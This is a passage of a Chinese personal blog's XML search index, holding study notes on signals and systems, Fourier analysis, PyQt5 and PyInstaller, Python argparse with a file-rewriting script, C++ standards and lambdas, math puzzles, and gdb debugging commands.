    <content type="text"><![CDATA[信号与线性系统是学习自动控制理论的前置专业基础课，可惜当年就学得似懂非懂，过了这么多年，知识早就忘了，现在捡起来温习一下，算是温故而知新吧。 信号与系统基础连续的或离散的动态系统，按其基本特性可分为线性的与非线性的；时变的与时不变的；因果的与非因果的；稳定与非稳定的。 连续系统的时域分析对单输入与单输出的线性时不变连续系统，通常适用n阶常系数线性微分方程表示： y^{(n)}(t)+a_{n-1}y^{(n-1)}(t)+...+a_1y^{(1)}(t)+a_0y(t) \\ =b_mf^{(m)}(t)+b_{m-1}f^{(m-1)}(t)+...+b_1f^{(1)}(t)+b_0f(t) \tag{1}或缩写为 \sum_{i=0}^{n}a_iy^{(i)}(t)=\sum_{j=0}^{m}b_jy^{(j)}(t)其中$f(t)$为激励，$y(t)$为响应，$a_i(i=0,1,…,n)$和$b_j(j=0,1,…,n)$均为常数，$a_n=1$。 该微分方程的全解由齐次解$y_h(t)$和特解$y_p(t)$组成，即 y(t)=y_h(t)+y_p(t)参考链接 1. 信号与线性系统—-究竟在学啥？,by Dean Rossi. 2. 信号与线性系统——信号的分解,by Dean Rossi. 3. 信号与线性系统——啥？卷积？,by Dean Rossi. 4. 信号与线性系统——你好，傅里叶,by Dean Rossi. 5. 信号与线性系统——F.T&amp;L.T,by Dean Rossi. 7. 信号与线性系统——系统的分析方法,by Dean Rossi.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>控制理论</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[傅里叶级数和变换学习笔记]]></title>
    <url>%2F2019%2F07%2F01%2F%E5%82%85%E9%87%8C%E5%8F%B6%E7%BA%A7%E6%95%B0%E5%92%8C%E5%8F%98%E6%8D%A2%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[在数学中，傅里叶级数（Fourier series）能将任何周期函数或周期信号分解成一个（可能由无穷个元素组成的）简单振荡函数的集合，即正弦函数和余弦函数（或者，等价地使用复指数）。傅里叶变换（Fourier transform）是一种线性积分变换，用于信号在时域（或空域）和频域之间的变换，在物理学和工程学中有许多应用。傅里叶变换就像化学分析，确定物质的基本成分；信号来自自然界，也可对其进行分析，确定其基本成分。 傅里叶级数公式傅里叶级数的公式： f(t) =\frac{a_{0}}{2}+a_{1}cos(\omega t)+b_{1}sin(\omega t) \\ +a_{2}cos(2\omega t)+b_{2}sin(2\omega t) +...\\ =\frac{a_{0}}{2}+\sum_{n=1}^{\infty}{[a_{n}cos(n\omega t)+b_{n}sin(n\omega t)]} \tag{1}其中： a_{n}=\frac{2}{T}\int_{t_{0}}^{t_{0}+T}f(t)cos(n\omega t)dt \tag{2} b_{n}=\frac{2}{T}\int_{t_{0}}^{t_{0}+T}f(t)sin(n\omega t)dt \tag{3}傅里叶级数的收敛性若傅里叶级数不收敛于$f(t)$，则不能在两者之间画等号。关于傅里叶级数的收敛性，最常用的为狄利克雷条件： 对于一个周期为$2\pi$的函数$f(x)$，如果它满足： （1）在一个周期内连续或只有有限个第一类间断点； （2）在一个周期内只有有限个极值点。 那么$f(x)$的傅里叶级数收敛于$\frac{f(x+0)+f(x-0)}{2}$。 狄利克雷条件只是傅里叶级数收敛的充分条件，而非必要条件，级数收敛不代表该条件成立。 下面给出一个周期函数的傅里叶级数的计算示例。 周期为$2\pi$的函数$f(x)$，在$(-\pi,\pi)$上$f(x)=x$，求$f(x)$的傅里叶级数。 a_n=\frac{1}{\pi}\int_{-\pi}^{\pi}x\mathrm{cos}nx\mathrm{d}x=0b_n=\frac{1}{\pi}\int_{-\pi}^{\pi}x\mathrm{sin}nx\mathrm{d}x=(-1)^{n+1}\frac{2}{n}狄利克雷条件显然成立，所以 f(x)=\sum^{\infty}_{n=1}(-1)^{n+1}\frac{2}{n}\mathrm{sin}nx傅里叶级数的指数形式令$i$表示虚数单位，傅里叶级数的指数形式为: f(t)=\sum^{\infty}_{n=-\infty}c_ne^{in\omega t}其中, c_n=\frac{1}{T}\int^{T}_{0}f(t)e^{-in\omega t}\mathrm{d}t指数形式与三角形式是相等的，推导如下: \begin{aligned} &\quad\sum^{\infty}_{n=-\infty}c_ne^{in\omega t}\\ &=c_0+\sum^{\infty}_{n=1}(c_ne^{in\omega t}+c_{-n}e^{-in\omega t}） \\ &=c_0+\sum^{\infty}_{n=1}[(c_n+c_{-n})\mathrm{cos}n\omega t+i(c_n-c_{-n})\mathrm{sin}n\omega t] \\ &=\frac{a_0}{2}+\sum_{n=1}^{\infty}(a_n \mathrm{cos}n \omega t+b_n \mathrm{sin}n \omega t) \end{aligned}傅里叶变换傅里叶变换是傅里叶级数在非周期函数上的推广。对非周期函数$f(x)$，其周期$T\rightarrow\infty$。因为$\omega_0=\frac{2\pi}{T}$，则$\omega_0\rightarrow0$。 观察傅里叶级数的指数形式 f(t)=\sum^{\infty}_{n=-\infty}c_ne^{in\omega t} \tag{1}其中, c_n=\frac{1}{T}\int^{T}_{0}f(t)e^{-in\omega t}\mathrm{d}t \tag{2}当 $\omega_0\rightarrow0$ 时， $n\omega_0$ 从原本的离散变化变成了连续变化， $c_n$ 也就可以表示为关于 $n\omega_0$ 的函数 $F(n\omega_0)$ 。 傅里叶级数中公式（2）的积分的上下限不一定是$0$到$T$，只需要$f(t)$的一个周期就可以了。即对于任意的$x_0$, 公式(2)可表示为： c_n=\frac{1}{T}\int^{x_0+T}_{x_0}f(t)e^{-in\omega_0 t}\mathrm{d}t \tag{3}这个积分需要积一整个周期，而此时的周期为无穷大，也就是整个定义域上都需要积，所以要从$-\infty$积分到$\infty$。 只需要让上式中的 $T\rightarrow\infty$ ， $\omega_0\rightarrow0$ ，便可以得到 $F(n\omega_0)$ 的表达式。不妨令 $\omega=n\omega_0$ ，就得到了 F(\omega)=\frac{1}{T}\int^{\infty}_{-\infty}f(t)e^{-i\omega t}\mathrm{d}t \tag{4}由于$\frac{1}{T}\rightarrow0$，我们先丢弃$\frac{1}{T}$，之后用到$F(\omega)$在乘回来，于是令： F(\omega)=\int^{\infty}_{-\infty}f(t)e^{-i\omega t}\mathrm{d}t \tag{5}将公式（5）代入公式（1），并代入$\frac{1}{T}=\frac{\omega_0}{2\pi}$，则有： f(t)=\frac{1}{2\pi}\sum^{\infty}_{n=-\infty}F(n\omega_0)e^{in\omega_0 t}\omega_0 \tag{6}因为 $\omega=n\omega_0$ ，每次 $\omega$ 的增量 $d\omega$ 都是由于 $n$ 变为 $n+1$ 造成的，所以 \mathrm{d}\omega=(n+1)\omega_0-n\omega_0=\omega_0同时 $n\omega_0$ 连续变化，原本的离散意义下的求和就该变为连续意义下的积分，于是公式（6）变形为： f(t)=\frac{1}{2\pi}\int_{-\infty}^{\infty}F(\omega)e^{i\omega t}\mathrm{d}\omega \tag{7}至此得到傅里叶变换的两个公式： F(\omega)=ℱ[f(t)]=\int^{\infty}_{-\infty}f(t)e^{-i\omega t}\mathrm{d}tf(t)=ℱ^{-1}[F(\omega)]=\frac{1}{2\pi}\int_{-\infty}^{\infty}F(\omega)e^{i\omega t}\mathrm{d}\omega傅里叶变换条件由于傅里叶变换是从傅里叶级数推导得来的，所以还是狄利克雷条件，不过此时还要加上第三条， $f(t)$ 在一个周期内绝对可积。 这一个条件在 $f(t)$ 为周期函数时，可以由前两个条件推出来，因为周期和函数值均为有限值，所以在一个周期内一定绝对可积。但是推广到傅里叶变换后，这个推导就不成立了，需要单独判定第三个条件。 参考链接 傅里叶分析之掐死教程,by Heinrich. 傅里叶级数和傅里叶变换,by 木不shi丁. 傅里叶级数和傅里叶变换是什么关系？,by 马同学. 傅里叶级数与傅里叶变换推导,by 令狐哦打. 傅里叶级数,by wikipedia. 傅里叶变换,by wikipedia. 傅里叶系列（一）傅里叶级数的推导,by ElPsyCongree. 傅里叶变换（一） 傅里叶级数,by misaka. 傅里叶变换交互式入门,by Jez Swanson.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>计算机视觉</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用python3+PyQt5+PyCharm桌面GUI开发]]></title>
    <url>%2F2019%2F06%2F29%2F%E4%BD%BF%E7%94%A8python3-PyQt5-pycharm%E6%A1%8C%E9%9D%A2GUI%E5%BC%80%E5%8F%91%2F</url>
    <content type="text"><![CDATA[下面简单介绍基于Python3、PyQt5和PyCharm进行桌面GUI开发。 环境配置安装python3PyQt5所支持的python版本是从3.5开始的，因此安装的Python3版本必须大于3.5。 安装PyQt512pip3 install PyQt5pip3 install PyQt5-tools 安装PyCharm安装完PyCharm后，需要配置Qt Designer和PyUIC，前者用于设计UI，后者用于将UI转成Py文件。 具体步骤请参考程序员之路：python3+PyQt5+pycharm桌面GUI开发。 简单示例12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152# -*- coding: utf-8 -*-# Form implementation generated from reading ui file &apos;clearWaterPrintGui.ui&apos;## Created by: PyQt5 UI code generator 5.11.3## WARNING! All changes made in this file will be lost!from PyQt5 import QtCore, QtGui, QtWidgetsclass Ui_Form(object): def setupUi(self, Form): Form.setObjectName(&quot;Form&quot;) Form.resize(400, 300) self.label_DirPath = QtWidgets.QLabel(Form) self.label_DirPath.setGeometry(QtCore.QRect(16, 52, 72, 15)) self.label_DirPath.setObjectName(&quot;label_DirPath&quot;) self.label_ExtName = QtWidgets.QLabel(Form) self.label_ExtName.setGeometry(QtCore.QRect(31, 112, 72, 15)) self.label_ExtName.setObjectName(&quot;label_ExtName&quot;) self.buttonBox = QtWidgets.QDialogButtonBox(Form) self.buttonBox.setGeometry(QtCore.QRect(190, 260, 193, 28)) self.buttonBox.setInputMethodHints(QtCore.Qt.ImhNone) self.buttonBox.setStandardButtons(QtWidgets.QDialogButtonBox.Cancel|QtWidgets.QDialogButtonBox.Ok) self.buttonBox.setObjectName(&quot;buttonBox&quot;) self.lineEdit_DirPath = QtWidgets.QLineEdit(Form) self.lineEdit_DirPath.setGeometry(QtCore.QRect(100, 50, 281, 21)) self.lineEdit_DirPath.setObjectName(&quot;lineEdit_DirPath&quot;) self.lineEdit_ExtName = QtWidgets.QLineEdit(Form) self.lineEdit_ExtName.setGeometry(QtCore.QRect(100, 112, 281, 21)) self.lineEdit_ExtName.setObjectName(&quot;lineEdit_ExtName&quot;) self.retranslateUi(Form) QtCore.QMetaObject.connectSlotsByName(Form) def retranslateUi(self, Form): _translate = QtCore.QCoreApplication.translate Form.setWindowTitle(_translate(&quot;Form&quot;, &quot;Form&quot;)) self.label_DirPath.setText(_translate(&quot;Form&quot;, &quot;文件路径：&quot;)) self.label_ExtName.setText(_translate(&quot;Form&quot;, &quot;扩展名：&quot;))# 下面代码是手动添加的if __name__==&quot;__main__&quot;: import sys from PyQt5.QtGui import QIcon app=QtWidgets.QApplication(sys.argv) widget=QtWidgets.QWidget() ui=Ui_Form() ui.setupUi(widget) # widget.setWindowIcon(QIcon(&apos;web.png&apos;))#增加icon图标，如果没有图片可以没有这句 widget.show() sys.exit(app.exec_()) 参考链接 程序员之路：python3+PyQt5+pycharm桌面GUI开发,by 莫水千流. 使用PyQt快速开发GUI应用,by Prayer. PyQt,by wikipedia.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python程序打包成exe]]></title>
    <url>%2F2019%2F06%2F29%2FPython%E7%A8%8B%E5%BA%8F%E6%89%93%E5%8C%85%E6%88%90exe%2F</url>
    <content type="text"><![CDATA[大部分人是普通人，不知道如何运行Python脚本程序，因此有必要将Python脚本程序打包成可执行文件，免去安装Python环境，提高Python脚本程序的可用性。 打包方法Python脚本程序的发布有三种方法： .py文件：对于开源项目或者源码没那么重要的，直接提供源码，需要使用者自行安装Python并且安装依赖的各种库。 .pyc文件：有些公司或个人因为机密或者各种原因，不愿意源码被运行者看到，可以使用pyc文件发布，pyc文件是Python解释器可以识别的二进制码，故发布后也是跨平台的，需要使用者安装相应版本的Python和依赖库。 可执行文件：对于非码农用户，最简单的方式就是提供一个可执行文件，只需要把用法告诉他即可。比较麻烦的是需要针对不同平台需要打包不同的可执行文件（Windows, Linux, Mac,…）。 下面介绍将Python脚本程序打包成可执行程序的各种工具。 表1 各种打包工具的对比 Solution Windows Linux OS X Python 3 One file mode Zipfile import Eggs pkg_resources support bbFreeze yes yes yes no no yes yes yes py2exe yes no no yes yes yes no no pyInstaller yes yes yes yes yes no yes no cx_Freeze yes yes yes yes no yes yes no py2app no no yes yes no yes yes yes 从上述对Python脚本程序打包工具对比可知，推荐使用pyInstaller。 PyInstaller打包示例安装PyInstaller1pip install pyinstaller 打包Python脚本打包Python脚本成单独的 .exe 文件。 1pyinstaller -F yourprogram.py 参考链接 如何将 Python 程序打包成 .exe 文件？,by 刘哈哈. Python程序打包成exe可执行文件,by 知行流浪.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python命令行参数解析示例]]></title>
    <url>%2F2019%2F06%2F29%2FPython%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%8F%82%E6%95%B0%E8%A7%A3%E6%9E%90%E7%A4%BA%E4%BE%8B%2F</url>
    <content type="text"><![CDATA[最新需要一个小程序实现解析命令行参数、遍历指定文件夹，处理指定扩展名的文件。于是简单用python实现一下。 库选择参数解析sys.argv解析Python中命令行参数的最传统的方法是通过sys.argv。但这种方法比较古老，灵活性很差，同时解析出来的参数都是str类型。但在编写简单脚本，参数较少且固定时比较方便。 getopt模块getopt模块是专门处理命令行参数的模块，用于获取命令行选项和参数，也就是sys.argv。命令行选项使得程序的参数更加灵活。支持短选项模式（-）和长选项模式（—）。 optparse模块optparse，功能强大，易于使用，可以方便地生成标准的、符合Unix/Posix 规范的命令行说明。但在Python2.7后就已经弃用不再维护。 argparse模块argparse模块是Python内置的参数解析模块，使用起来比较简单且功能强大。 ArgumentParser类创建时的参数如下： prog - 程序的名字（默认：sys.argv[0]） usage - 描述程序用法的字符串（默认：从解析器的参数生成） description - 参数帮助信息之前的文本（默认：空） epilog - 参数帮助信息之后的文本（默认：空） parents - ArgumentParser 对象的一个列表，这些对象的参数应该包括进去 formatter_class - 定制化帮助信息的类 prefix_chars - 可选参数的前缀字符集（默认：‘-‘） fromfile_prefix_chars - 额外的参数应该读取的文件的前缀字符集（默认：None） argument_default - 参数的全局默认值（默认：None） conflict_handler - 解决冲突的可选参数的策略（通常没有必要） add_help - 给解析器添加-h/–help 选项（默认：True） add_argument函数的参数如下： name or flags - 选项字符串的名字或者列表，例如foo 或者-f, –foo。 action - 在命令行遇到该参数时采取的基本动作类型。 nargs - 应该读取的命令行参数数目。 const - 某些action和nargs选项要求的常数值。 default - 如果命令行中没有出现该参数时的默认值。 type - 命令行参数应该被转换成的类型。 choices - 参数可允许的值的一个容器。 required - 该命令行选项是否可以省略（只针对可选参数）。 help - 参数的简短描述。 metavar - 参数在帮助信息中的名字。 dest - 给parse_args()返回的对象要添加的属性名称。 参数解析模块比较 getopt，只能简单的处理命令行参数，无法解析一个参数多个值的情况，如 —file file1 file2 file3。 optparse，功能强大，易于使用，可以方便地生成标准的、符合Unix/Posix 规范的命令行说明。但在Python2.7后就已经弃用不再维护。 argparse，使其更加容易的编写用户友好的命令行接口。它所需的程序进程了参数定义，argparse将更好的解析sys.argv。同时argparse模块还能自动生成帮助及用户输入错误参数时的提示信息。 文件夹遍历文件夹遍历有两种方法： 使用os.walk 123456789# -*- coding: utf-8 -*- import os def Test1(rootDir): list_dirs = os.walk(rootDir) for root, dirs, files in list_dirs: for d in dirs: print os.path.join(root, d) for f in files: print os.path.join(root, f) 使用os.listdir 12345678# -*- coding: utf-8 -*- import os def Test2(rootDir): for lists in os.listdir(rootDir): path = os.path.join(rootDir, lists) print path if os.path.isdir(path): Test2(path) 文件处理Python内置了读写文件的函数，用法和C是兼容的。本节介绍内容大致有：文件的打开/关闭、文件对象、文件的读写等。 代码示例示例代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041# -*- coding: utf-8 -*- import os import argparse# 遍历文件夹def traverse(pathName,extName): extNameList=extName.split(&apos; &apos;) print(extNameList) list_dirs = os.walk(pathName) for root, dirs, files in list_dirs: for f in files: targetExt=os.path.splitext(f)[-1] if targetExt.lower() in extNameList: clearWaterPrint(os.path.join(root, f))def clearWaterPrint(fileName): print(fileName) fileOrgin=open(fileName,&apos;rb&apos;) fileTarget=open(fileName+&apos;.exe&apos;,&apos;wb&apos;) fileTarget.write(fileOrgin.read()) fileOrgin.close() os.remove(fileName) fileTarget.close() os.rename(fileName+&apos;.exe&apos;,fileName) # Driver Code if __name__ == &apos;__main__&apos;: # 首先创建一个ArgumentParser对象 parser = argparse.ArgumentParser(description=&apos;Process the water print!&apos;) # 添加--path设置文件目录 parser.add_argument(&apos;-p&apos;,&apos;--path&apos;, type = str,dest=&apos;pathName&apos;, help=&apos;give the path of directory&apos;, default = &apos;./&apos;) # 添加--ext设置文件目录 parser.add_argument(&apos;-e&apos;,&apos;--ext&apos;, type = str,dest=&apos;extName&apos;, help=&apos;give the extension name of file&apos;, default = &apos;.doc .docx .wav .txt .xml .dot .html .jpg .png&apos;,nargs = &apos;*&apos;) #返回一个命名空间,如果想要使用变量,可用args.attr args = parser.parse_args() # Calling traverse() function traverse(args.pathName,args.extName) 使用方法如下：12python3 clearWaterPrint.py -hpython3 clearWaterPrint.py -p /home/test -e .doc .ppt 参考链接 Python的命令行参数解析,by Tyan. Python中最好用的命令行参数解析工具,by Mingle Wong. Python遍历文件夹的两种方法比较,by likecao. 读写字节数据,by python3-cookbook. 读写二进制文件,by funhacks.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[C++标准演化简介]]></title>
    <url>%2F2019%2F06%2F26%2FCPlusPlus%E6%A0%87%E5%87%86%E6%BC%94%E5%8C%96%E7%AE%80%E4%BB%8B%2F</url>
    <content type="text"><![CDATA[最近阅读采用C++编写的MAVROS源码，遇到很多C++语言的新特性，理解起来很费劲，因此，特地分析一下C++标准演变过程，学习其进化过程中引入的新特性，提高C++源码阅读效率。 C++标准演变2017年12月05日，ISO C++ 委员会正式发布了 C++ 17 标准，官方名称为 ISO/IEC 14882:2017。之前发布的C++标准有C++14、C++11、C++03、C++98。 C++98C++98是第一个C++标准。它分为两个部分：核心语言和C++标准程序库；后者包含了大部分标准模板库和C标准程序库的稍加修改版本。存在许多不属于标准部分的C++程序库，且使用外部链接，程序库甚至可以用C撰写。 C++标准程序库充分吸收了C标准程序库，并佐以少许的修改，使其与C++良好的运作。另一个大型的程序库部分，是以标准模板库（STL）为基础，STL于1994年2月正式成为ANSI/ISO C++。它提供了实用的工具，如容器类（如：Array和Vector），迭代器（广义指针）提供容器以类似数组的访问方式，以及泛型算法进行搜索和排序的运算。此外还提供了(multi)map和(multi)set，它们都共享相似的成员函数。因此，以下成为可能，使用模板撰写泛型算法，它可以和任何容器或在任何以迭代器定义的序列上运作。如同C，使用#include指令包含标准表头，即可访问程序库里的功能。C++提供69个标准表头，其中19个不再赞成使用。 使用标准模板库（例如：使用std::vector或std::string来取代C风格的数组或字符数组）有助于导向更安全和更灵活的软件。 在STL在纳入C++标准以前，是来自HP和后来的SGI的第三方程式库，标准中并未称之为“STL”，它只是标准库中的一部分，但仍有许多人使用这个名称，以别于其它的标准库（输入／输出流、国际化、诊断、C程序库子集，等等）。 另外，如std::basic_string此类标准委员会添加的接口，有时也被误认为STL；实际上它们并不存在于原始的SGI STL中，在标准化后SGI STL才从标准库吸收加入其中。 C++03C++03 是 C++ 语言国际标准的一个版本，正式名称是 ISO/IEC 14882:2003。该标准由国际标准化组织（ISO）和国际电工委员会（IEC）共同制定。 C++03 取代了 C++ 标准的前一个版本 C++98，后被 C++11 所取代。C++03 主要是在前一个版本的基础上针对实现方的一些问题进行了修复，从而在各个实现间达到一致、保持了可移植性。该版本共涉及 92 项核心语言缺陷报告、125 项库缺陷报告，所提供的新特性只有一项：值初始化（英语：value initialization）。 C++03 的第 69 号库缺陷报告非常值得一提，为了解决该问题，标准中加入了“std::vector 中的元素必须连续存储”的要求。 C++11C++11，先前被称作C++0x，即ISO/IEC 14882:2011，是C++编程语言的一个标准。它取代第二版标准ISO/IEC 14882:2003（第一版ISO/IEC 14882:1998公开于1998年，第二版于2003年更新，分别通称C++98以及C++03，两者差异很小），且已被C++14取代。相比于C++03，C++11标准包含核心语言的新机能，而且扩展C++标准程序库，并入了大部分的C++ Technical Report 1程序库（数学的特殊函数除外）。 ISO／IEC JTC1/SC22/WG21 C++标准委员会计划在2010年8月之前完成对最终委员会草案的投票，以及于2011年3月召开的标准会议完成国际标准的最终草案。然而，WG21预期ISO将要花费六个月到一年的时间才能正式发布新的C++标准。为了能够如期完成，委员会决定致力于直至2006年为止的提案，忽略新的提案。最终于2011年8月12日公布，并于2011年9月出版。 2012年2月28日的国际标准草案是最接近于C++11标准的草案，差异仅有编辑上的修正。 像C++这样的编程语言，透过一种演化的的过程来发展其定义。这个过程不可避免地将引发与现有代码的兼容问题，在C++的发展过程中偶尔会发生。不过根据比雅尼·斯特劳斯特鲁普（C++的创始人并且是委员会的一员）表示，新的标准将几乎100%兼容于现有标准。 C++14C++14是C++的现行标准的非正式名称，正式名称为”International Standard ISO/IEC 14882:2014(E) Programming Language C++”。C++14旨在作为C++11的一个小扩展，主要提供漏洞修复和小的改进。C++14标准的委员会草案（Committee Draft）N3690于2013年5月15日发表。工作草案（Working Draft）N3936已于2014年3月2日完成。最终的投票期结束于2014年8月15日，结果（一致通过）已于8月18日公布。 C++17C++17又称C++1z，是C++的现行标准的非正式名称，正式名称为”International Standard ISO/IEC Programming Language C++”。C++17旨在作为大型扩展，最终的投票期将于2017年结束。 当前不少著名C++编译器已支持C++17仍未定案的草案（draft），例如最新的GCC6已支持C++ concept的C++事务型内存（Transactional Memory），Visual Studio与Clang当前都提供了modules。 C++新语言特性Lambda函数与表示式在标准C++，特别是当使用C++标准程序库算法函数诸如sort和find，用户经常希望能够在算法函数调用的附近定义一个临时的述部函数（又称谓词函数，predicate function）。由于语言本身允许在函数内部定义类别，可以考虑使用函数对象，然而这通常既麻烦又冗赘，也阻碍了代码的流程。此外，标准C++不允许定义于函数内部的类别被用于模板，所以前述的作法是不可行的。 C++11对lambda（即匿名函数）的支持可以解决上述问题。 一个lambda函数可以用如下的方式定义： 1[](int x, int y) &#123; return x + y; &#125; 这个不具名函数的回返类型是decltype(x+y)。只有在lambda函数匹配”return expression”的形式下，它的回返类型才能被忽略。在前述的情况下，lambda函数仅能为一个述句。 在一个更为复杂的例子中，回返类型可以被明确的指定如下： 1[](int x, int y) -&gt; int &#123; int z = x + y; return z + x; &#125; 本例中，一个临时的参数z被创建用来存储中间结果。如同一般的函数，z的值不会保留到下一次该不具名函数再次被调用时。 如果lambda函数没有传回值（例如void），其回返类型可被完全忽略。 定义在与lambda函数相同作用域的参数引用也可以被使用。这种的参数集合一般被称作closure（闭包）。 123456[] // 沒有定义任何变量。使用未定义变量会引发错误。[x, &amp;y] // x以传值方式传入（默认），y以引用方式传入。[&amp;] // 任何被使用到的外部变量都隐式地以引用方式加以引用。[=] // 任何被使用到的外部变量都隐式地以传值方式加以引用。[&amp;, x] // x显式地以传值方式加以引用。其余变量以引用方式加以引用。[=, &amp;z] // z显式地以引用方式加以引用。其余变量以传值方式加以引用。 参考链接 C++,by wikipedia. C++ 的历史,by cppreference. C++03,by wikipedia. C++11,by wikipedia. C++14,by wikipedia. C++17,by wikipedia.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[有趣的数学游戏]]></title>
    <url>%2F2019%2F06%2F23%2F%E6%9C%89%E8%B6%A3%E7%9A%84%E6%95%B0%E5%AD%A6%E6%B8%B8%E6%88%8F%2F</url>
    <content type="text"><![CDATA[记录一些有趣的数学游戏，与小伙伴分享。 三门问题问题描述三门问题（Monty Hall problem）亦称为蒙提霍尔问题、蒙特霍问题或蒙提霍尔悖论，大致出自美国的电视游戏节目Let’s Make a Deal。 问题名字来自该节目的主持人蒙提·霍尔（Monty Hall）。参赛者会看见三扇关闭了的门，其中一扇的后面有一辆汽车，选中后面有车的那扇门可赢得该汽车，另外两扇门后面则各藏有一只山羊。当参赛者选定了一扇门，但未去开启它的时候，节目主持人开启剩下两扇门的其中一扇，露出其中一只山羊。主持人其后会问参赛者要不要换另一扇仍然关上的门。问题是：换另一扇门会否增加参赛者赢得汽车的机率？ 问题解答漫画：反直觉的 “三门问题” 海盗分金币问题问题描述经济学上有个“海盗分金”模型：是说5个海盗抢得100枚金币，他们按抽签的顺序依次提方案：首先由1号提出分配方案，然后5人表决，投票要超过半数同意方案才被通过，否则他将被扔入大海喂鲨鱼，依此类推。 “海盗分金”其实是一个高度简化和抽象的模型，体现了博弈的思想。在“海盗分金”模型中，任何“分配者”想让自己的方案获得通过的关键是事先考虑清楚“挑战者”的分配方案是什么，并用最小的代价获取最大收益，拉拢“挑战者”分配方案中最不得意的人们。 问题解答漫画：有趣的海盗问题 参考链接 漫画：反直觉的 “三门问题”,by 小灰. 漫画：有趣的海盗问题,by 小灰.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>游戏</tag>
        <tag>数学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[gdb调试入门]]></title>
    <url>%2F2019%2F06%2F23%2Fgdb%E8%B0%83%E8%AF%95%E5%85%A5%E9%97%A8%2F</url>
    <content type="text"><![CDATA[GDB是一个由GNU开源组织发布的、UNIX/LINUX操作系统下的、基于命令行的、功能强大的程序调试工具。 对于一名Linux下工作的c++程序员，gdb是必不可少的工具。 启动gdb对C/C++程序的调试，需要在编译前就加上-g选项。对大型项目，一般选择Debug选项进行编译以 方便gdb调试。 1$ g++ -g hello.cpp -o hello 调试可执行文件: 1$gdb &lt;program&gt; program也就是你的执行文件，一般在当前目录下。 gdb交互命令启动gdb后，进入到交互模式，通过以下命令完成对程序的调试；注意高频使用的命令一般都会有缩写，熟练使用这些缩写命令能提高调试的效率； 运行 run：简记为 r ，其作用是运行程序，当遇到断点后，程序会在断点处停止运行，等待用户输入下一步的命令。 continue （简写c ）：继续执行，到下一个断点处（或运行结束） next：（简写 n），单步跟踪程序，当遇到函数调用时，也不进入此函数体；此命令同 step 的主要区别是，step 遇到用户自定义的函数，将步进到函数中去运行，而 next 则直接调用函数，不会进入到函数体内。 step （简写s）：单步调试如果有函数调用，则进入函数；与命令n不同，n是不进入调用的函数的 until：当你厌倦了在一个循环体内单步跟踪时，这个命令可以运行程序直到退出循环体。 until+行号： 运行至某行，不仅仅用来跳出循环 finish： 运行程序，直到当前函数完成返回，并打印函数返回时的堆栈地址和返回值及参数值等信息。 call 函数(参数)：调用程序中可见的函数，并传递“参数”，如：call gdb_test(55) quit：简记为 q ，退出gdb 设置断点 break n （简写b n）:在第n行处设置断点（可以带上代码路径和代码名称： b OAGUPDATE.cpp:578） b fn1 if a＞b：条件断点设置 break func（break缩写为b）：在函数func()的入口处设置断点，如：break cb_button delete 断点号n：删除第n个断点 disable 断点号n：暂停第n个断点 enable 断点号n：开启第n个断点 clear 行号n：清除第n行的断点 info b （info breakpoints） ：显示当前程序的断点设置情况 delete breakpoints：清除所有断点 查看源代码 list ：简记为 l ，其作用就是列出程序的源代码，默认每次显示10行。 list 行号：将显示当前文件以“行号”为中心的前后10行代码，如：list 12 list 函数名：将显示“函数名”所在函数的源代码，如：list main list ：不带参数，将接着上一次 list 命令的，输出下边的内容。 打印表达式 print 表达式：简记为 p ，其中“表达式”可以是任何当前正在被测试程序的有效表达式，比如当前正在调试C语言的程序，那么“表达式”可以是任何C语言的有效表达式，包括数字，变量甚至是函数调用。 print a：将显示整数 a 的值 print ++a：将把 a 中的值加1,并显示出来 print name：将显示字符串 name 的值 print gdb_test(22)：将以整数22作为参数调用 gdb_test() 函数 print gdb_test(a)：将以变量 a 作为参数调用 gdb_test() 函数 display 表达式：在单步运行时将非常有用，使用display命令设置一个表达式后，它将在每次单步进行指令后，紧接着输出被设置的表达式及值。如： display a watch 表达式：设置一个监视点，一旦被监视的“表达式”的值改变，gdb将强行终止正在被调试的程序。如： watch a whatis ：查询变量或函数 info function： 查询函数 扩展info locals： 显示当前堆栈页的所有变量 查询运行信息 where/bt ：当前运行的堆栈列表； bt backtrace 显示当前调用堆栈 up/down 改变堆栈显示的深度 set args 参数:指定运行时的参数 12set args -l a -C abcset args -l=a -C=abc show args：查看设置好的参数 info program： 来查看程序的是否在运行，进程号，被暂停的原因。 分割窗口 layout：用于分割窗口，可以一边查看代码，一边测试： layout src：显示源代码窗口 layout asm：显示反汇编窗口 layout regs：显示源代码/反汇编和CPU寄存器窗口 layout split：显示源代码和反汇编窗口 Ctrl + L：刷新窗口 参考链接 gdb 调试利器,by Linux Tools Quick Tutorial. GDB调试带参数的程序（转载＋整理+实践）,by blacet.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[随机抽样一致]]></title>
    <url>%2F2019%2F06%2F23%2F%E9%9A%8F%E6%9C%BA%E6%8A%BD%E6%A0%B7%E4%B8%80%E8%87%B4%2F</url>
